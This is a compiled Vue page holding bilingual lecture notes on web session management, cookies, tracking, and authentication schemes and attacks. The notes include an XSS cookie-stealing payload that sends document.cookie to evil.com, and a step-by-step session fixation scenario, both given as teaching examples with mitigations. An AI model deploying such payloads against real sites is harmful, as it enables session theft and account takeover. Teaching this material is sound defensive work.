import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as r,c as l,a as e,b as i,d as o,e as n}from"./app-f3f8173e.js";const c={},d=n('<h1 id="authentication-authorization" tabindex="-1"><a class="header-anchor" href="#authentication-authorization" aria-hidden="true">#</a> Authentication &amp; Authorization</h1><h2 id="session-management" tabindex="-1"><a class="header-anchor" href="#session-management" aria-hidden="true">#</a> Session Management</h2><ul><li>Each request is independent of each other</li><li>Sufficient for「足够的」 serving static content (.html, .css, .jpg, etc.)</li><li>But the server cannot tell which requests come from the same user</li><li>Why does state useful? <ul><li>for personalized services and user conveniences</li><li>e.g., any signed-in user experience</li><li>consider you need to enter your password again after each click</li></ul></li></ul><p>Solution: associate requests originated from the same user, i.e., maintaining a user session</p><p>or, tracking your cyber-whereabouts and breaking your privacy?</p><ul><li>i.e., a double-edged sword</li><li>Third Party cookies</li></ul><p>Note the privacy law, e.g., GDPR, EU Cookie Law (always ask for permission)</p>',7),h={href:"http://amiunique.org",target:"_blank",rel:"noopener noreferrer"},u=n('<h2 id="cookies-communications" tabindex="-1"><a class="header-anchor" href="#cookies-communications" aria-hidden="true">#</a> Cookies Communications</h2><p>Making HTTP “Stateful” Using (HTTP/Web/Browser) Cookies</p><p>Cookies := a small ( ) client-side storage with its data replayed to where they were onfigured (cookie origin )</p><figure><img src="https://pic.hanjiaming.com.cn/2025/04/07/f1cc55a2756be.png" alt="1744013520557.png" tabindex="0" loading="lazy"><figcaption>1744013520557.png</figcaption></figure><h3 id="session-creation-and-resumption-using-cookies" tabindex="-1"><a class="header-anchor" href="#session-creation-and-resumption-using-cookies" aria-hidden="true">#</a> Session Creation and Resumption using Cookies</h3>',5),p={href:"http://example.com",target:"_blank",rel:"noopener noreferrer"},m=e("strong",null,"cookies",-1),g=e("li",null,[i("The server gives a Cookie value (w/ Set-Cookie "),e("strong",null,"response"),i(" header)")],-1),f=e("li",null,[i('i.e., the web server told the browser to create a cookie for that "'),e("strong",null,"origin"),i('"'),e("br"),i(" (A cookie can also be created at the client-side)")],-1),k=n('<h3 id="session-maintenance-using-cookies" tabindex="-1"><a class="header-anchor" href="#session-maintenance-using-cookies" aria-hidden="true">#</a> Session Maintenance using Cookies</h3><ul><li>Cookie Values can store user preferences (e.g., theme=yellow)</li><li>Setting a unique, random, and unpredictable &quot;token&quot; (a.k.a. session ID)</li><li>The server can then isolate a user-specific session from other sessions</li><li>Usage: Personalization, Authentication, and Session Storage (express-session)</li></ul><h2 id="cookie-parameters" tabindex="-1"><a class="header-anchor" href="#cookie-parameters" aria-hidden="true">#</a> Cookie Parameters</h2><figure><img src="https://pic.hanjiaming.com.cn/2025/04/07/08e9efaa1fcb4.png" alt="1744016410810.png" tabindex="0" loading="lazy"><figcaption>1744016410810.png</figcaption></figure><p>Expires: specify the time when a cookie will be deleted automatically</p><ul><li>Seconds since the epoch time (00:00:00 UTC 1970-01-01)</li><li>(Default) Setting it to 0 (zero) creates a session cookie， Browser will automatically clear a session cookie when shutdown</li><li>Setting it to a past time tells the browser to remove the cookie (&quot;immediately&quot;)</li><li>or use res.clearCookie (name, [ options ]) with matching option</li></ul>',6),b={class:"hint-container note"},v=e("p",{class:"hint-container-title"},"Cookie SOP Examples",-1),y=e("figure",null,[e("img",{src:"https://pic.hanjiaming.com.cn/2025/04/07/64422c7508481.png",alt:"Google Chrome 2025-04-07 17.36.50.png",tabindex:"0",loading:"lazy"}),e("figcaption",null,"Google Chrome 2025-04-07 17.36.50.png")],-1),w={href:"http://example.com",target:"_blank",rel:"noopener noreferrer"},_={href:"http://www.example.com",target:"_blank",rel:"noopener noreferrer"},x=n("<ul><li><strong>Cookie:</strong> <code>user=niki</code></li><li>Explanation: The domain <code>.example.com</code> matches <code>example.com</code> and <code>www.example.com</code>, and the path <code>/</code> matches any path, so <code>user=niki</code> is sent.</li></ul>",1),S={href:"http://secure.example.com",target:"_blank",rel:"noopener noreferrer"},C={href:"https://secure.example.com",target:"_blank",rel:"noopener noreferrer"},A=n("<ul><li><strong>Cookie:</strong> <code>user=niki</code></li><li>Explanation: The domain <code>.example.com</code> matches <code>secure.example.com</code>, and the path <code>/</code> matches any path, so <code>user=niki</code> is sent. The <code>user=ling</code> cookie is not sent because it is secure and the connection is not HTTPS.</li></ul>",1),P={href:"https://secure.example.com/accounts/index.html",target:"_blank",rel:"noopener noreferrer"},T=n("<ul><li><strong>Cookies:</strong> <code>user=ling; user=niki</code></li><li>Explanation: Both cookies match. The domain <code>secure.example.com</code> matches both cookies, the path <code>/accounts</code> matches the path of <code>user=ling</code>, and <code>/</code> matches the path of <code>user=niki</code>. Both cookies are sent, but the order is non-deterministic.</li></ul>",1),q={href:"https://secure.example.com/accounts/new/index.html",target:"_blank",rel:"noopener noreferrer"},H=e("ul",null,[e("li",null,[e("strong",null,"Cookies:"),i(),e("code",null,"user=ling; user=niki")]),e("li",null,"Explanation: Same reasoning as the previous URL. Both cookies match and are sent, but the order is non-deterministic.")],-1),I=e("p",null,"According to RFC 6265, when multiple cookies with the same name are present, the order in which they are sent is not guaranteed. This can lead to non-deterministic behavior.",-1),z=n('<h2 id="problems-of-using-cookies" tabindex="-1"><a class="header-anchor" href="#problems-of-using-cookies" aria-hidden="true">#</a> Problems of Using Cookies</h2><h3 id="privacy-from-a-user-perspective" tabindex="-1"><a class="header-anchor" href="#privacy-from-a-user-perspective" aria-hidden="true">#</a> Privacy from a user perspective</h3><ul><li>We know how a site can uniquely identify a user</li><li>What are the resulted threats (and opportunities)?</li><li>Should user be tracked across apps/webs? (how? by )</li></ul><p>Integrity「正直」 and Authenticity「真实性」</p><ul><li>Cookies values reside on client-side</li><li>That said, malicious users can tamper with the values</li><li>Signed Cookies: HMAC for authenticity and integrity (&quot;secret&quot; in express/cookie-session)</li></ul><p>Storage Size</p><ul><li>A cookie has at most 4KB per domain</li><li>Recall the best practice: We want to keep the name/value size minimal to reduce bandwidth overhead</li></ul><h3 id="cookie-privacy" tabindex="-1"><a class="header-anchor" href="#cookie-privacy" aria-hidden="true">#</a> Cookie Privacy</h3>',8),M={href:"http://xn--ad-2r8dy38g.com",target:"_blank",rel:"noopener noreferrer"},U=e("code",null,"Referer",-1),D={href:"http://C.com",target:"_blank",rel:"noopener noreferrer"},R=e("li",null,"ad.com通过响应头设置Cookie到用户浏览器，标记用户身份。",-1),E={href:"http://xn--D-zn6a4eo8v31p47d105bfsjf7jbk5amox.com",target:"_blank",rel:"noopener noreferrer"},B={href:"http://C.com",target:"_blank",rel:"noopener noreferrer"},L={href:"http://D.com",target:"_blank",rel:"noopener noreferrer"},N=e("code",null,"Referer",-1),O=e("p",null,"Solution:",-1),j={href:"http://C.xn--comad-7n1ht32vf7wcy9b.com",target:"_blank",rel:"noopener noreferrer"},W={href:"http://xn--ad-6c5cxhq3hx7qwiet7ibk9aijjg96dpbfbpf.com",target:"_blank",rel:"noopener noreferrer"},F=e("li",null,"利用浏览器漏洞或指纹识别技术（如设备指纹）替代Cookie跟踪。",-1),G=e("li",null,[e("strong",null,"启用反追踪策略"),i("： "),e("ul",null,[e("li",null,"完全屏蔽第三方Cookie（如Safari的智能防跟踪ITP）。"),e("li",null,[i("发送"),e("code",null,"Do Not Track"),i("请求头（需网站配合）。")]),e("li",null,"阻止已知跟踪域名的请求（如Firefox的增强型跟踪保护）。")])],-1),V=n(`<p>But there are problems other than cookies...(Referer Header, link decorating)</p><h3 id="cookie-integrity-and-authenticity" tabindex="-1"><a class="header-anchor" href="#cookie-integrity-and-authenticity" aria-hidden="true">#</a> Cookie Integrity and Authenticity</h3><p>Cookie values can be tampered</p><ul><li>Cookie is just another kind of &quot;user&quot; (e.g., attacker) inputs</li><li>Apply server-side validations for cookies, e.g., use signedCookies</li><li>For confidential values, (authenticated) is needed</li><li>There are special middleware/APIs to do them</li><li>Or you can implement by yourself (if you understand crypto)</li></ul><p>Parameter Tampering Attack: Many old/naive shopping carts store &quot;totalAmount&quot; in cookies</p><h2 id="other-client-side-session-storage" tabindex="-1"><a class="header-anchor" href="#other-client-side-session-storage" aria-hidden="true">#</a> Other Client-side Session Storage</h2><ul><li>HTML5 LocalStorage (5MB /origin)</li><li>Unlike Cookies, does not replay in requests but accessible via JS API</li><li>Useful to store specific service&#39;s offline content offline, e.g., Gmail</li><li>Security: Follows the HTML5 SOP</li><li>Security: Client-side storage is still subject to tampering attacks</li><li>There is also . (lives like session cookie; origin: domain+protocol)</li></ul><h2 id="why-not-both" tabindex="-1"><a class="header-anchor" href="#why-not-both" aria-hidden="true">#</a> Why not both?</h2><p>How about storing something both on the server and the client sides?</p><p>Worst of both worlds?</p><ul><li>Client storage could be adversarially manipulated</li><li>Server still needs to maintain resource for each client</li></ul><p>We need a cleverer way enjoy the best of both worlds</p><ul><li>Authenticated encryption of client-side storage!</li><li>Server holds a short secret key for ALL clients, e.g., 256-bit for AES</li><li>Without the key, client cannot produce meaningful ciphertexts produced by authenticated encryption</li><li>Trades off computation against storage i/o overhead</li><li>JSON Web Token (JWT): data with optional signature + encryption on JSON</li></ul><div class="hint-container info"><p class="hint-container-title">Cookies vs. localStorage vs. Session Mgt.</p><ul><li><strong>Cookies</strong>: Client/server-readable, auto-sent with requests (4KB max). Used for auth (e.g., session IDs), support expiration. Secure with <code>HttpOnly</code>.</li><li><strong>localStorage</strong>: Client-only, persistent (5-10MB), no auto-transfer. Ideal for client-side data (e.g., preferences).</li><li><strong>Session Management</strong>: Typically server-side (session IDs in cookies) for user state. Alternatively, <code>sessionStorage</code> (client, tab-scoped, cleared on close).<br><em>Key differences</em>: Scope, persistence, size, and server interaction. Cookies handle auth; localStorage stores local data; sessions manage state securely.</li></ul></div><h2 id="authentication-vs-authorization" tabindex="-1"><a class="header-anchor" href="#authentication-vs-authorization" aria-hidden="true">#</a> Authentication vs. Authorization</h2><p>Authentication: Is a user really whom he claims himself to be?</p><ul><li>something you know: password, private key</li><li>something you have: CULink, one-time hardware token</li><li>who you are: biometric features like fingerprints</li><li>what you do: the way you shake/tap smartphone</li><li>where you are: FB checks if country changed, IP, GPS</li><li>or a combination of n of them (the so-called n-factor authentication or nFA)</li></ul><p>Authorization: Is an authenticated user allowed to do a task?</p><ul><li>Most common: Role-based access control</li><li>e.g., is user A allowed to do task T1</li></ul><h2 id="credentials-database" tabindex="-1"><a class="header-anchor" href="#credentials-database" aria-hidden="true">#</a> Credentials Database</h2><p>Hash based Message Authentication Code (HMAC)</p><ul><li>HMAC is a keyed function to calculate a MAC (Prevent length-extension attack on MD hashes). [H(key || H(key || msg))]</li><li>(don&#39;t use SHA1); pick memory-hard hash functions: Argon2, scrypt, bcrypt</li><li>Use prepared statement. NEVER try to concatentate a SQL statement by yourself!</li><li>Implement hmacPassword () function.</li></ul><h2 id="authentication-token-authorization" tabindex="-1"><a class="header-anchor" href="#authentication-token-authorization" aria-hidden="true">#</a> Authentication Token &amp; Authorization</h2><p>Authenticate the token before admin operations</p><ul><li>The cookie value is &quot;signed&quot; with the provided secret</li><li>A tampered value will mismatch with the &quot;signature&quot;</li><li>Attacker cannot generate the corresponding &quot;signature&quot; without secret</li><li>(Precisely, it is message authentication code, not signature)</li></ul><p>Authorization check before admin operations</p><ul><li>Only upon a successful login</li><li>req.session.username and req.session.admin are set according to DB</li></ul><p>For subsequent requests,</p><ul><li>req.session.username accessible means logged-in user</li><li>req.session.admin accessible means a logged-in admin user</li></ul><div class="hint-container tip"><p class="hint-container-title">Best Practice on Session Isolation</p><p>We often separate auth cookies from other session cookies -&gt; connection sessionId (expires = 3 mths) and auth (expires: 180s)</p><p>Authentication Cookies</p><ul><li>auth should be configured with tighter security</li><li>secure (i.e., https only)</li><li>httpOnly (i.e., no JS access)</li><li>path (restricted to a specific folder)</li><li>Expire more often</li></ul><p>General Session Cookies</p><ul><li>Associated with less critical data</li><li>Some can be stored in localStorage at client side</li></ul></div><h2 id="security-issues-regarding-cookie-auth" tabindex="-1"><a class="header-anchor" href="#security-issues-regarding-cookie-auth" aria-hidden="true">#</a> Security Issues regarding Cookie Auth.</h2><p>Session Hijacking: Stealing cookies with XSS attacks</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;img src=&quot;404&quot; onerror=&quot;this.src=&#39;//evil.com/&#39;+escape(document.cookie)&quot;/&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Attacker presents the stolen cookies to impersonate a victim</p><ul><li>Mitigation 1: Reduce the risk by making cookie expire sooner</li><li>Mitigation 2: Set the flag HttpOnly for your cookies</li></ul><p>Session Fixation: Forcing session id designed by attackers</p><ul><li>Cause: A vulnerable website let its user determine session id</li><li>Some vulnerable systems allow user input as session id</li><li>Attacker sends a URL with a custom PHPSESSID to a victim</li><li>Victim visits the URL and login using the particular session</li><li>Attacker visits the same URL and hijacks the session</li><li>Mitigation: Change the session id upon login</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>攻击者生成一个特定的「PHPSSESSID」，例如“123456”。
攻击者构建一个带有自定义「PHPSSESSID」的URL，例如“http://example.com/login.php?PHPSESSID=123456”。
攻击者通过电子邮件或其他方式发送该URL给受害者。
受害者点击该URL并登录电子商务网站。
网站使用攻击者设置的「PHPSSESSID」创建「session」并保持受害者的登录状态。
攻击者访问同一个URL并劫持该「session」，从而能够访问受害者的账户。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="http-basic-authentication" tabindex="-1"><a class="header-anchor" href="#http-basic-authentication" aria-hidden="true">#</a> HTTP (Basic) Authentication</h2><ul><li>The standardized and traditional way to authenticate a user</li><li>Not favorable by commercial websites since it&#39;s not customizable</li><li>Use this over HTTPs (sensitive data are not protected in HTTP)</li></ul><figure><img src="https://pic.hanjiaming.com.cn/2025/04/08/e2ac42aae7576.png" alt="1744105328170.png" tabindex="0" loading="lazy"><figcaption>1744105328170.png</figcaption></figure><ul><li>Realm: protection space (diff. page, same space).</li><li>With Nginx: + apache2-util to create password file.</li><li>With Node: Set headers, or use package express-basic-auth</li><li>MDN: HTTP Authentication</li></ul><h2 id="http-digest-authentication" tabindex="-1"><a class="header-anchor" href="#http-digest-authentication" aria-hidden="true">#</a> HTTP (Digest) Authentication</h2><figure><img src="https://pic.hanjiaming.com.cn/2025/04/08/c0d78315ef07e.png" alt="1744105730206.png" tabindex="0" loading="lazy"><figcaption>1744105730206.png</figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>eg.

用户输入用户名和密码。
客户端发送初始请求，服务器返回401 Unauthorized状态码，并提供摘要认证参数（nonce、realm、opaque等）。
客户端使用用户名、密码、nonce、请求URI等参数计算HA1和HA2：
HA1 = MD5(username: realm: password)
HA2 = MD5(method: digestURI)
客户端使用HA1、nonce、nonceCount、clientNonce、qop和HA2计算response哈希值：
response = MD5(HA1: nonce: nonceCount: clientNonce: qop: HA2)
客户端发送带有认证信息的请求，包括用户名、realm、nonce、uri、response等参数。
服务器验证response哈希值，如果匹配，则允许访问资源。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="general-authentication-attacks" tabindex="-1"><a class="header-anchor" href="#general-authentication-attacks" aria-hidden="true">#</a> General Authentication Attacks</h2><ul><li>Brute force Dictionary -&gt; enumerating possible passwords</li><li>Eavesdropping and Session Hijacking「窃听和会话劫持」 <ul><li>reading the password in plaintext protocol</li><li>replaying captured session token (or if it can be easily guessed)</li></ul></li><li>Shoulder surfing: looking over shoulders when entering password</li><li>Phishing (Nowadays&#39; threats) -&gt; providing a fake webpage to lure genuine password</li><li>Time-of-check to Time-of-use (TOCTTOU) <ul><li>Race condition between the checking and actual usage.</li><li>e.g., taking over by unauthorized person after authentication (e.g., login)</li></ul></li><li>Others...(Broken Access Control makes authentication scheme useless)</li></ul><div class="hint-container info"><p class="hint-container-title">Enforce Proper Password Strength (incl. length, complexity) (check NIST 800-63)</p><p>TOCTTOU是一种竞态条件漏洞，发生在系统检查某个条件与实际使用资源之间的时间间隙。攻击者可能利用这个时间间隙进行恶意操作。例如，系统在检查用户权限后，攻击者在实际使用资源前改变了资源的状态，从而绕过权限检查。</p><p>eg.</p><ol><li>用户提交转账请求，系统检查用户是否具有转账权限。</li><li>权限检查通过后，系统准备执行转账操作。</li><li>在执行转账操作前，攻击者修改转账请求的目标账户。</li><li>系统执行转账操作，将资金转移到攻击者的账户。</li></ol></div><h2 id="best-practices-of-password-authentication" tabindex="-1"><a class="header-anchor" href="#best-practices-of-password-authentication" aria-hidden="true">#</a> Best Practices of Password Authentication</h2>`,49),J=n("<li>Enforce Proper Password Strength (incl. length, complexity) (check NIST 800-63)</li><li>Require Current Password for Password Changes</li><li>Implement Secure Password Recovery</li><li>Use Multi-factor Authentication</li><li>Prompt for Proper Authentication Error Messages <ul><li>Good: Login failed. Invalid user ID or password</li><li>BAD: Login for User A: invalid password</li></ul></li><li>Send Password only over Secure HTTPS Connections</li><li>Store Password in its One-way Hashed Format</li><li>Implement Account Lockout after Failed Attempts</li><li><strong>Not reinventing the wheel (cryptography)</strong></li>",9),K=e("li",null,"Consider 2FA (email [Bonus] or SMS).",-1),Q={href:"https://webauthn.io/",target:"_blank",rel:"noopener noreferrer"};function X(Y,Z){const t=s("ExternalLinkIcon");return r(),l("div",null,[d,e("p",null,[i("P.S. We are not talking about website fingerprinting here (fyi: "),e("a",h,[i("amiunique.org"),o(t)]),i(").")]),u,e("ul",null,[e("li",null,[i("In the 1st visit, the browser makes a request to "),e("a",p,[i("example.com"),o(t)]),i(" w/ no "),m]),g,f]),k,e("div",b,[v,y,e("ol",null,[e("li",null,[e("p",null,[e("strong",null,[e("a",w,[i("http://example.com"),o(t)]),i(" or "),e("a",_,[i("http://www.example.com"),o(t)])])]),x]),e("li",null,[e("p",null,[e("strong",null,[e("a",S,[i("http://secure.example.com"),o(t)]),i(" or "),e("a",C,[i("https://secure.example.com"),o(t)])])]),A]),e("li",null,[e("p",null,[e("strong",null,[e("a",P,[i("https://secure.example.com/accounts/index.html"),o(t)])])]),T]),e("li",null,[e("p",null,[e("strong",null,[e("a",q,[i("https://secure.example.com/accounts/new/index.html"),o(t)])])]),H])]),I]),z,e("ul",null,[e("li",null,[i("当访问C.com时，页面内嵌入的广告（"),e("a",M,[i("来自ad.com"),o(t)]),i("）会向ad.com发送请求。")]),e("li",null,[i("请求头中的"),U,i("字段会携带当前页面URL（"),e("a",D,[i("C.com"),o(t)]),i("），告知广告商用户正在访问的网站。")]),R,e("li",null,[e("a",E,[i("当用户访问另一个网站D.com"),o(t)]),i("（同样嵌入ad.com广告）时，浏览器会自动携带之前设置的Cookie，广告商即可关联两个网站的访问行为。")])]),e("p",null,[i("广告商通过不同网站（"),e("a",B,[i("C.com"),o(t)]),i("、"),e("a",L,[i("D.com"),o(t)]),i("）的Cookie和"),N,i("信息，分析用户的浏览习惯、兴趣，最终实现精准广告投放。")]),O,e("ul",null,[e("li",null,[i("浏览器默认禁止跨域（第三方）网站在未经用户同意的情况下写入Cookie。例如，"),e("a",j,[i("C.com页面中的ad.com"),o(t)]),i(" iframe无法直接设置Cookie。")]),e("li",null,[i("广告商的绕过方法 "),e("ul",null,[e("li",null,[i("使用重定向："),e("a",W,[i("诱导用户点击广告跳转到ad.com"),o(t)]),i("，使其成为“第一方”从而设置Cookie。")]),F])]),G]),V,e("ul",null,[J,e("li",null,[i("Or not use Password Authentication alone. "),e("ul",null,[K,e("li",null,[i("OAuth and Webauthn: "),e("a",Q,[i("https://webauthn.io/"),o(t)])])])])])])}const ie=a(c,[["render",X],["__file","auth.html.vue"]]);export{ie as default};
